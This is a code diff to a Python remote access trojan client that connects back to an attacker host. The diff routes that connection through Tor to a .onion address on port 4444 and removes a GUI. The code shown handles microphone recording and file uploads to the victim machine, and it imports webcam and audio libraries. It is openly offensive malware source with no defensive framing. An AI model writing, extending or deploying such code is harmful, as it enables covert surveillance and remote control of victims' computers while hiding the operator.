@@ -1,11 +1,10 @@
 import socket
+import socks
 import subprocess
 import os
 import base64
 import time
 import threading
-import tkinter as tk
-from tkinter import ttk
 import cv2
 import wave
 import pyaudio
@@ -21,8 +20,10 @@ stop = False
 def connect():
 	while True:
 		try:
+			socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+			socket.socket = socks.socksocket
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(('192.168.100.6', 4444))  # IP and Port of the attacker machine
+			s.connect(('3xazduds5wdy57xzgnni3azqtzdt5eahufpp44gdevw2rvqi4mrwi4yd.onion', 4444))  # IP and Port of the attacker machine
 			return s
 		except Exception:
 			time.sleep(5)
@@ -136,7 +137,7 @@ def record_microphone(duration=5):
         
         print("Recording microphone...")
         frames = []
-        while not stop : #for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        while not stop : 
             if stop:
                 break
             data = stream.read(CHUNK)
@@ -186,8 +187,8 @@ def rat_client():
 				except Exception as e:
 					s.send(str.encode(f"Error: {str(e)}"))
 			elif command.startswith('upload '):
-				path = command[7:]	
-				content = s.recv(1000000).decode()
+				path = command [7:]
+				content = s.recv(100000).decode()
 				content = base64.b64decode(content.encode())
 				write_file(path, content)
 				s.send(str.encode("Upload complete"))
